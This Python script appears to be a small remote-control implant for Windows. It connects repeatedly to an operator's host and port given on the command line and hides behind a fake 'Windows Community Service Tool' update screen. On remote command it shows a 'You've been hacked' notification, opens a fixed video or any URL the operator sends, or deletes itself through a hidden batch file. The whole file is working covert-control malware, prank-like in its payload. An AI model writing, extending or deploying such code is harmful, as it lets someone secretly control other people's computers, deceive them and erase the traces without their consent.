import socket
import sys
import os
from winotify import Notification, audio
import subprocess
import webbrowser as wb
import time

notification = Notification(app_id="Python", title="Hi :3", msg="You've been hacked :3", duration="long")
notification.set_audio(audio.Mail, loop=False)

script_path = os.path.abspath(sys.argv[0])

HOST = None
PORT = None

for i in range(1, len(sys.argv), 2):
    HOST = str(sys.argv[1])
    PORT = int(sys.argv[2])


def delete_self():
    if os.name == "nt":
        batch = f"""
        @echo off
        timeout /t 1 > nul
        del "{script_path}" > nul 2>&1
        del "%~f0" > nul 2>&1
        """

        batchfile = script_path + ".deleter.bat"
        with open(batchfile, "w") as bat:
            bat.write(batch)

        #run it in BG & delete it
        subprocess.Popen(f'start /min cmd /c "{batchfile}"', shell=True)
        sys.exit()

def flash_screen():
    for i in range(100):
        print()
    
    print("""
                        Updating Windows Community Service Tool. . .
          
                            Please remain patient
          
                        The application will close when the update is finished
          
""")
    for i in range(10):
        print()

flash_screen()

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        #s.settimeout(None)  # Remove timeout

        while True:
            try:
                command = s.recv(1024).decode()
                #print("received command: ", command)

                if command:

                    if command.lower() == "self_destruct" or command.lower() == "kill":
                        delete_self()

                    elif command.lower() == "show_warning" or command.lower() == "show":
                        notification.show()

                    elif command.lower() == "furry_trap" or command.lower() == "fur_trap":
                        wb.open_new_tab("https://www.youtube.com/watch?v=rlkSMp7iz6c")
                    
                    elif "open_link" in command.lower():
                        command, args = command.split()
                        wb.open_new_tab(args)

                else:
                    print("broke, restarting connection to the Internet")
                    s.close()
                    break

            except Exception:
                print("broke, restarting connection to the Internet")
                s.close()
                break

    except Exception:
        print("broke, Connecting failed")
        time.sleep(2)
